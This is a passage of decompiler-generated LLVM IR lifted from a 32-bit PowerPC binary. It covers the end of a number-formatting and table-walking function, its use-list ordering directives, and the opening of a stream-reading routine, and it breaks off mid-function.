  store i32 %v1_1000a14c, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a154

dec_label_pc_1000a154:                            ; preds = %dec_label_pc_1000a138, %dec_label_pc_1000a14c
  %v0_1000a16831 = phi i32 [ %v0_1000a138, %dec_label_pc_1000a138 ], [ %v1_1000a14c, %dec_label_pc_1000a14c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a158 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000a158, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a168

dec_label_pc_1000a168:                            ; preds = %dec_label_pc_1000a168.backedge, %dec_label_pc_1000a154
  %v2_1000a188 = phi i32 [ %v3_1000a188, %dec_label_pc_1000a168.backedge ], [ %v2_1000a158, %dec_label_pc_1000a154 ]
  %v0_1000a16c = phi i32 [ %v0_1000a16c.pre, %dec_label_pc_1000a168.backedge ], [ 2, %dec_label_pc_1000a154 ]
  %v1_1000a168 = phi i32 [ %v1_1000a168.pre, %dec_label_pc_1000a168.backedge ], [ 10, %dec_label_pc_1000a154 ]
  %v1_1000a17c = phi i32 [ %v0_1000a168.pre, %dec_label_pc_1000a168.backedge ], [ %v0_1000a16831, %dec_label_pc_1000a154 ]
  %v2_1000a168 = sdiv i32 %v1_1000a17c, %v1_1000a168
  store i32 %v2_1000a168, i32* %r0.global-to-local, align 4
  %v1_1000a16c = add i32 %v0_1000a16c, 1
  store i32 %v1_1000a16c, i32* %r7.global-to-local, align 4
  %v1_1000a170 = icmp slt i32 %v1_1000a16c, 3
  %v3_1000a170 = icmp eq i32 %v1_1000a16c, 3
  store i1 %v1_1000a170, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a170, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a178 = icmp slt i32 %v2_1000a168, 0
  %v2_1000a178 = icmp sgt i32 %v2_1000a168, 0
  %v3_1000a178 = icmp eq i32 %v2_1000a168, 0
  store i1 %v1_1000a178, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a178, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a178, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000a168, -10
  store i32 %v2_1000a168, i32* %r11.global-to-local, align 4
  %v2_1000a17c = add i32 %v1_1000a17c, 48
  %v1_1000a184 = add i32 %v2_1000a17c, %tmp81
  store i32 %v1_1000a184, i32* %r9.global-to-local, align 4
  %v1_1000a188 = trunc i32 %v1_1000a184 to i8
  %v3_1000a188 = add i32 %v2_1000a188, -1
  %v4_1000a188 = inttoptr i32 %v3_1000a188 to i8*
  store i8 %v1_1000a188, i8* %v4_1000a188, align 1
  store i32 %v3_1000a188, i32* %r10.global-to-local, align 4
  %v0_1000a18c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a18c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000a18c = or i1 %v0_1000a18c, %v1_1000a18c
  br i1 %v2_1000a18c, label %dec_label_pc_1000a168.backedge, label %dec_label_pc_1000a190

dec_label_pc_1000a168.backedge:                   ; preds = %dec_label_pc_1000a168, %dec_label_pc_1000a190
  %v0_1000a168.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a168.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000a16c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a168

dec_label_pc_1000a190:                            ; preds = %dec_label_pc_1000a168
  %v0_1000a190 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000a190, label %dec_label_pc_1000a194, label %dec_label_pc_1000a168.backedge

dec_label_pc_1000a194:                            ; preds = %dec_label_pc_1000a190
  %v1_1000a194 = add i32 %v2_1000a188, -2
  store i32 %v1_1000a194, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000a19c = add i32 %v2_1000a188, -3
  store i32 %v1_1000a19c, i32* %r11.global-to-local, align 4
  %v0_1000a1a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a1a0 = trunc i32 %v0_1000a1a0 to i8
  %v4_1000a1a0 = inttoptr i32 %v1_1000a194 to i8*
  store i8 %v1_1000a1a0, i8* %v4_1000a1a0, align 1
  %v0_1000a1a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a1a4 = trunc i32 %v0_1000a1a4 to i8
  %v2_1000a1a4 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a1a4 = add i32 %v2_1000a1a4, -1
  %v4_1000a1a4 = inttoptr i32 %v3_1000a1a4 to i8*
  store i8 %v1_1000a1a4, i8* %v4_1000a1a4, align 1
  %v0_1000a1a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a1a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a1a8 = inttoptr i32 %v1_1000a1a8 to i32*
  store i32 %v0_1000a1a8, i32* %v2_1000a1a8, align 4
  %v0_1000a1ac = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a1ac = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a1ac = add i32 %v1_1000a1ac, 4
  %v3_1000a1ac = inttoptr i32 %v2_1000a1ac to i32*
  store i32 %v0_1000a1ac, i32* %v3_1000a1ac, align 4
  %v0_1000a1b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a1b0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a1b0 = add i32 %v1_1000a1b0, 8
  %v3_1000a1b0 = inttoptr i32 %v2_1000a1b0 to i32*
  store i32 %v0_1000a1b0, i32* %v3_1000a1b0, align 4
  %v0_1000a1b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a1b4 = add i32 %v0_1000a1b4, 12
  store i32 %v1_1000a1b4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a1b8

dec_label_pc_1000a1b8:                            ; preds = %dec_label_pc_1000a130, %dec_label_pc_10009d0c, %dec_label_pc_1000a194
  %v0_1000a234 = phi i32 [ %v1_1000a1c437, %dec_label_pc_1000a130 ], [ %v2_10009d18, %dec_label_pc_10009d0c ], [ %v1_1000a1b4, %dec_label_pc_1000a194 ]
  %v2_1000a1b8 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000a1b8, i32* %r9.global-to-local, align 4
  %v1_1000a1c8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a1bc

dec_label_pc_1000a1bc:                            ; preds = %dec_label_pc_1000a1bc, %dec_label_pc_1000a1b8
  %v1_1000a1c8 = phi i32 [ %v2_1000a1c8, %dec_label_pc_1000a1bc ], [ %v1_1000a1c8.pre, %dec_label_pc_1000a1b8 ]
  %v0_1000a1bc = phi i32 [ %v1_1000a1c0, %dec_label_pc_1000a1bc ], [ %v2_1000a1b8, %dec_label_pc_1000a1b8 ]
  %v1_1000a1bc = inttoptr i32 %v0_1000a1bc to i32*
  %v2_1000a1bc = load i32, i32* %v1_1000a1bc, align 4
  store i32 %v2_1000a1bc, i32* %r0.global-to-local, align 4
  %v1_1000a1c0 = add i32 %v0_1000a1bc, 12
  store i32 %v1_1000a1c0, i32* %r9.global-to-local, align 4
  %v2_1000a1c4 = icmp ult i32 %v1_1000a1c0, %v0_1000a234
  %v2_1000a1c8 = sub i32 %v1_1000a1c8, %v2_1000a1bc
  store i32 %v2_1000a1c8, i32* @r28, align 4
  br i1 %v2_1000a1c4, label %dec_label_pc_1000a1bc, label %dec_label_pc_1000a1d0

dec_label_pc_1000a1d0:                            ; preds = %dec_label_pc_1000a1bc
  %v4_1000a1c4 = icmp eq i32 %v1_1000a1c0, %v0_1000a234
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a1c4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a1d0 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000a234, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000a1d0, 0
  %v1_1000a1e4 = zext i1 %tmp85 to i32
  store i32 %v1_1000a1e4, i32* %r9.global-to-local, align 4
  %v2_1000a1e8 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000a1e8, i32* %r0.global-to-local, align 4
  %v2_1000a1ec = sub i32 %v2_1000a1c8, %v1_1000a1e4
  store i32 %v2_1000a1ec, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000a1ec, 1
  br i1 %tmp82, label %dec_label_pc_1000a258, label %dec_label_pc_1000a1fc

dec_label_pc_1000a1fc:                            ; preds = %dec_label_pc_1000a1d0
  %v3_1000a1fc = load i32, i32* %v2_10009c38, align 4
  store i32 %v3_1000a1fc, i32* %r0.global-to-local, align 4
  %v1_1000a200 = and i32 %v3_1000a1fc, 8
  store i32 %v1_1000a200, i32* %r7.global-to-local, align 4
  %v3_1000a200 = icmp eq i32 %v1_1000a200, 0
  br i1 %v3_1000a200, label %dec_label_pc_1000a224, label %dec_label_pc_1000a208

dec_label_pc_1000a208:                            ; preds = %dec_label_pc_1000a1fc
  %v1_1000a20c = add i32 %v0_1000a234, 12
  store i32 %v1_1000a20c, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1000f2cb.292 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a214 = inttoptr i32 %v0_1000a234 to i32*
  store i32 160, i32* %v2_1000a214, align 4
  %v0_1000a218 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a218 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a218 = add i32 %v1_1000a218, 4
  %v3_1000a218 = inttoptr i32 %v2_1000a218 to i32*
  store i32 %v0_1000a218, i32* %v3_1000a218, align 4
  %v0_1000a21c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a21c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a21c = add i32 %v1_1000a21c, 8
  %v3_1000a21c = inttoptr i32 %v2_1000a21c to i32*
  store i32 %v0_1000a21c, i32* %v3_1000a21c, align 4
  br label %dec_label_pc_1000a258

dec_label_pc_1000a224:                            ; preds = %dec_label_pc_1000a1fc
  %v1_1000a224 = add i32 %tmp, 16
  %v2_1000a224 = inttoptr i32 %v1_1000a224 to i32*
  %v3_1000a224 = load i32, i32* %v2_1000a224, align 4
  store i32 %v3_1000a224, i32* %r0.global-to-local, align 4
  %v1_1000a228 = icmp slt i32 %v3_1000a224, 48
  %v3_1000a228 = icmp eq i32 %v3_1000a224, 48
  store i1 %v1_1000a228, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a228, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a228, label %dec_label_pc_1000a230, label %dec_label_pc_1000a24c

dec_label_pc_1000a230:                            ; preds = %dec_label_pc_1000a224
  %v3_1000a230 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000a234, i32* @r30, align 4
  %v2_1000a238 = add i32 %v3_1000a230, %v2_1000a1ec
  store i32 %v2_1000a238, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a238, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000a258

dec_label_pc_1000a244:                            ; preds = %dec_label_pc_1000a260
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000a294

dec_label_pc_1000a24c:                            ; preds = %dec_label_pc_1000a224
  store i32 %v2_1000a1c8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a234, i32* @r30, align 4
  br label %dec_label_pc_1000a258

dec_label_pc_1000a258:                            ; preds = %dec_label_pc_1000a1d0, %dec_label_pc_1000a230, %dec_label_pc_1000a208, %dec_label_pc_1000a24c
  store i32 0, i32* @r29, align 4
  %v2_1000a25c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000a25c, i32* @r31, align 4
  br label %dec_label_pc_1000a260

dec_label_pc_1000a260:                            ; preds = %dec_label_pc_1000a290, %dec_label_pc_1000a258
  %v0_1000a270 = phi i32 [ %v1_1000a27c, %dec_label_pc_1000a290 ], [ %v2_1000a25c, %dec_label_pc_1000a258 ]
  %v1_1000a260 = inttoptr i32 %v0_1000a270 to i32*
  %v2_1000a260 = load i32, i32* %v1_1000a260, align 4
  store i32 %v2_1000a260, i32* %r4.global-to-local, align 4
  %v0_1000a264 = load i32, i32* @r27, align 4
  store i32 %v0_1000a264, i32* %r3.global-to-local, align 4
  %v1_1000a268 = add i32 %v0_1000a270, 4
  %v2_1000a268 = inttoptr i32 %v1_1000a268 to i32*
  %v3_1000a268 = load i32, i32* %v2_1000a268, align 4
  store i32 %v3_1000a268, i32* %r5.global-to-local, align 4
  %v0_1000a26c = load i32, i32* @r26, align 4
  store i32 %v0_1000a26c, i32* %ctr.global-to-local, align 4
  %v1_1000a270 = add i32 %v0_1000a270, 8
  %v2_1000a270 = inttoptr i32 %v1_1000a270 to i32*
  %v3_1000a270 = load i32, i32* %v2_1000a270, align 4
  store i32 %v3_1000a270, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000a26c)
  %v0_1000a278 = load i32, i32* @r31, align 4
  %v1_1000a278 = add i32 %v0_1000a278, 4
  %v2_1000a278 = inttoptr i32 %v1_1000a278 to i32*
  %v3_1000a278 = load i32, i32* %v2_1000a278, align 4
  store i32 %v3_1000a278, i32* %r0.global-to-local, align 4
  %v1_1000a27c = add i32 %v0_1000a278, 12
  store i32 %v1_1000a27c, i32* @r31, align 4
  %v0_1000a280 = load i32, i32* @r29, align 4
  %v1_1000a280 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000a280 = add i32 %v1_1000a280, %v0_1000a280
  store i32 %v2_1000a280, i32* @r29, align 4
  %v2_1000a284 = icmp slt i32 %v1_1000a280, %v3_1000a278
  %v4_1000a284 = icmp eq i32 %v1_1000a280, %v3_1000a278
  store i1 %v2_1000a284, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a284, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a288 = load i32, i32* @r30, align 4
  %v2_1000a288 = icmp ult i32 %v1_1000a27c, %v1_1000a288
  %v3_1000a288 = icmp ugt i32 %v1_1000a27c, %v1_1000a288
  %v4_1000a288 = icmp eq i32 %v1_1000a27c, %v1_1000a288
  store i1 %v2_1000a288, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000a288, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000a288, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_1000a284, label %dec_label_pc_1000a290, label %dec_label_pc_1000a244

dec_label_pc_1000a290:                            ; preds = %dec_label_pc_1000a260
  br i1 %v2_1000a288, label %dec_label_pc_1000a260, label %dec_label_pc_1000a294

dec_label_pc_1000a294:                            ; preds = %dec_label_pc_1000a290, %dec_label_pc_1000a244
  %v0_1000a298 = phi i32 [ -1, %dec_label_pc_1000a244 ], [ %v2_1000a280, %dec_label_pc_1000a290 ]
  store i32 %v0_10009be8, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a298, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a298

; uselistorder directives
  uselistorder i32 %v0_1000a298, { 1, 0 }
  uselistorder i32 %v1_1000a280, { 2, 1, 0 }
  uselistorder i32 %v1_1000a27c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_1000a278, { 1, 0, 2 }
  uselistorder i32 %v0_1000a270, { 0, 2, 1 }
  uselistorder i32 %v3_1000a224, { 1, 0, 2 }
  uselistorder i32 %v1_1000a1e4, { 1, 0 }
  uselistorder i32 %v2_1000a1c8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000a1c0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a1bc, { 1, 0 }
  uselistorder i32 %v0_1000a234, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000a188, { 1, 2, 0 }
  uselistorder i32 %v1_1000a16c, { 1, 0, 2 }
  uselistorder i32 %v2_1000a168, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000a138, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000a108, { 2, 0, 1 }
  uselistorder i32 %v2_1000a104, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a074, { 1, 0 }
  uselistorder i32 %v2_10009fd8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10009fac, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10009f74, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10009f6c, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10009f38, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10009f28, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10009f1c, { 1, 0, 2 }
  uselistorder i32 %v1_10009f00, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10009eb8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10009ea8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10009e8c, { 1, 0 }
  uselistorder i32 %v1_10009e68, { 1, 0 }
  uselistorder i32 %v2_10009e48, { 1, 0, 2 }
  uselistorder i32 %v0_10009df0, { 1, 0 }
  uselistorder i32 %v1_10009c54, { 1, 0 }
  uselistorder i32 %v0_10009ce0, { 2, 1, 0 }
  uselistorder i32 %v1_10009c28, { 1, 0 }
  uselistorder i32 %v1_10009c08, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 36, 37, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 27, 25, 28, 29, 26, 31, 30, 32, 33, 34, 35, 38 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 17, 15, 18, 16, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000f2c8.290 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000a258, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a1b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a168.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a154, { 1, 0 }
  uselistorder label %dec_label_pc_1000a130, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a104, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a08c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a068, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a04c, { 1, 0 }
  uselistorder label %dec_label_pc_10009fbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009f58, { 1, 0 }
  uselistorder label %dec_label_pc_10009f18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009edc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009eb0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009e90, { 1, 0 }
  uselistorder label %dec_label_pc_10009e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10009d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10009c64, { 1, 0 }
  uselistorder label %dec_label_pc_10009c38, { 1, 0 }
  uselistorder label %dec_label_pc_10009c2c, { 1, 0 }
}

define i32 @function_1000a2ac(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a2ac:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000a2ac = load i32, i32* @lr, align 4
  store i32 %v0_1000a2ac, i32* %r0.global-to-local, align 4
  %v0_1000a2b4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a2c0 = add i32 %tmp, 16
  %v3_1000a2c0 = inttoptr i32 %v2_1000a2c0 to i32*
  %v4_1000a2c0 = load i32, i32* %v3_1000a2c0, align 4
  store i32 %v4_1000a2c0, i32* %r9.global-to-local, align 4
  %v2_1000a2c4 = add i32 %tmp, 24
  %v3_1000a2c4 = inttoptr i32 %v2_1000a2c4 to i32*
  %v4_1000a2c4 = load i32, i32* %v3_1000a2c4, align 4
  store i32 %v4_1000a2c4, i32* %r0.global-to-local, align 4
  %v2_1000a2c8 = icmp ult i32 %v4_1000a2c0, %v4_1000a2c4
  br i1 %v2_1000a2c8, label %dec_label_pc_1000a330, label %dec_label_pc_1000a2d0

dec_label_pc_1000a2d0:                            ; preds = %dec_label_pc_1000a2ac
  %v3_1000a2d0 = load i16, i16* %arg1, align 2
  %v4_1000a2d0 = zext i16 %v3_1000a2d0 to i32
  %v1_1000a2d4 = and i32 %v4_1000a2d0, 131
  store i32 %v1_1000a2d4, i32* %r0.global-to-local, align 4
  %v2_1000a2d8 = icmp ugt i32 %v1_1000a2d4, 128
  br i1 %v2_1000a2d8, label %dec_label_pc_1000a2f0, label %dec_label_pc_1000a2e0

dec_label_pc_1000a2e0:                            ; preds = %dec_label_pc_1000a2d0
  store i32 268477160, i32* @lr, align 4
  %v3_1000a2e4 = call i32 @function_1000b8d8(i16* inttoptr (i32 128 to i16*), i32 %v4_1000a2c0)
  store i32 %v3_1000a2e4, i32* %r3.global-to-local, align 4
  %v3_1000a2e8 = icmp eq i32 %v3_1000a2e4, 0
  br i1 %v3_1000a2e8, label %dec_label_pc_1000a2e0.dec_label_pc_1000a2f0_crit_edge, label %dec_label_pc_1000a3cc

dec_label_pc_1000a2e0.dec_label_pc_1000a2f0_crit_edge: ; preds = %dec_label_pc_1000a2e0
  %v0_1000a2f0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a2f0

dec_label_pc_1000a2f0:                            ; preds = %dec_label_pc_1000a2e0.dec_label_pc_1000a2f0_crit_edge, %dec_label_pc_1000a2d0
  %v2_1000a350 = phi i32 [ %v0_1000a2f0.pre, %dec_label_pc_1000a2e0.dec_label_pc_1000a2f0_crit_edge ], [ %tmp, %dec_label_pc_1000a2d0 ]
  %v1_1000a2f0 = inttoptr i32 %v2_1000a350 to i16*
  %v2_1000a2f0 = load i16, i16* %v1_1000a2f0, align 2
  %v3_1000a2f0 = zext i16 %v2_1000a2f0 to i32
  %v1_1000a2f4 = and i32 %v3_1000a2f0, 2
  store i32 %v1_1000a2f4, i32* %r0.global-to-local, align 4
  %v3_1000a2f4 = icmp eq i32 %v1_1000a2f4, 0
  br i1 %v3_1000a2f4, label %dec_label_pc_1000a320, label %dec_label_pc_1000a2fc

dec_label_pc_1000a2fc:                            ; preds = %dec_label_pc_1000a2f0
  %v1_1000a2fc = call i32 @__asm_rlwinm(i32 %v3_1000a2f0, i32 2, i32 29, i32 29)
  %v1_1000a300 = load i32, i32* @r31, align 4
  %v2_1000a300 = add i32 %v1_1000a300, %v1_1000a2fc
  store i32 %v2_1000a300, i32* %r9.global-to-local, align 4
  %v1_1000a304 = add i32 %v2_1000a300, 39
  %v2_1000a304 = inttoptr i32 %v1_1000a304 to i8*
  %v3_1000a304 = load i8, i8* %v2_1000a304, align 1
  %v4_1000a304 = zext i8 %v3_1000a304 to i32
  store i32 %v4_1000a304, i32* %r0.global-to-local, align 4
  %v1_1000a308 = add nsw i32 %v3_1000a2f0, -1
  store i32 %v1_1000a308, i32* %r9.global-to-local, align 4
  %v1_1000a30c = trunc i32 %v1_1000a308 to i16
  %v3_1000a30c = inttoptr i32 %v1_1000a300 to i16*
  store i16 %v1_1000a30c, i16* %v3_1000a30c, align 2
  %v0_1000a310 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a310, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000a318 = load i32, i32* @r31, align 4
  %v2_1000a318 = add i32 %v1_1000a318, 40
  %v3_1000a318 = inttoptr i32 %v2_1000a318 to i32*
  store i32 0, i32* %v3_1000a318, align 4
  br label %dec_label_pc_1000a3d0

dec_label_pc_1000a320:                            ; preds = %dec_label_pc_1000a2f0
  %v1_1000a320 = add i32 %v2_1000a350, 16
  %v2_1000a320 = inttoptr i32 %v1_1000a320 to i32*
  %v3_1000a320 = load i32, i32* %v2_1000a320, align 4
  store i32 %v3_1000a320, i32* %r9.global-to-local, align 4
  %v1_1000a324 = add i32 %v2_1000a350, 20
  %v2_1000a324 = inttoptr i32 %v1_1000a324 to i32*
  %v3_1000a324 = load i32, i32* %v2_1000a324, align 4
  store i32 %v3_1000a324, i32* %r0.global-to-local, align 4
  %v4_1000a328 = icmp eq i32 %v3_1000a324, %v3_1000a320
  br i1 %v4_1000a328, label %dec_label_pc_1000a33c, label %dec_label_pc_1000a330

dec_label_pc_1000a330:                            ; preds = %dec_label_pc_1000a320, %dec_label_pc_1000a2ac
  %v1_1000a3a47 = phi i32 [ %v2_1000a350, %dec_label_pc_1000a320 ], [ %tmp, %dec_label_pc_1000a2ac ]
  %v0_1000a330 = phi i32 [ %v3_1000a320, %dec_label_pc_1000a320 ], [ %v4_1000a2c0, %dec_label_pc_1000a2ac ]
  %v1_1000a330 = inttoptr i32 %v0_1000a330 to i8*
  %v2_1000a330 = load i8, i8* %v1_1000a330, align 1
  %v3_1000a330 = zext i8 %v2_1000a330 to i32
  store i32 %v3_1000a330, i32* %r3.global-to-local, align 4
  %v1_1000a334 = add i32 %v0_1000a330, 1
  store i32 %v1_1000a334, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a3a4

dec_label_pc_1000a33c:                            ; preds = %dec_label_pc_1000a320
  %v1_1000a33c = add i32 %v2_1000a350, 4
  %v2_1000a33c = inttoptr i32 %v1_1000a33c to i32*
  %v3_1000a33c = load i32, i32* %v2_1000a33c, align 4
  store i32 %v3_1000a33c, i32* %r0.global-to-local, align 4
  %v3_1000a340 = icmp eq i32 %v3_1000a33c, -2
  br i1 %v3_1000a340, label %dec_label_pc_1000a348, label %dec_label_pc_1000a358

dec_label_pc_1000a348:                            ; preds = %dec_label_pc_1000a33c
  %v1_1000a348 = or i32 %v3_1000a2f0, 4
  store i32 %v1_1000a348, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000a350 = trunc i32 %v1_1000a348 to i16
  store i16 %v1_1000a350, i16* %v1_1000a2f0, align 2
  br label %dec_label_pc_1000a3d0

dec_label_pc_1000a358:                            ; preds = %dec_label_pc_1000a33c
  %v1_1000a358 = and i32 %v3_1000a2f0, 768
  store i32 %v1_1000a358, i32* %r0.global-to-local, align 4
  %v3_1000a358 = icmp eq i32 %v1_1000a358, 0
  br i1 %v3_1000a358, label %dec_label_pc_1000a36c, label %dec_label_pc_1000a360

dec_label_pc_1000a360:                            ; preds = %dec_label_pc_1000a358
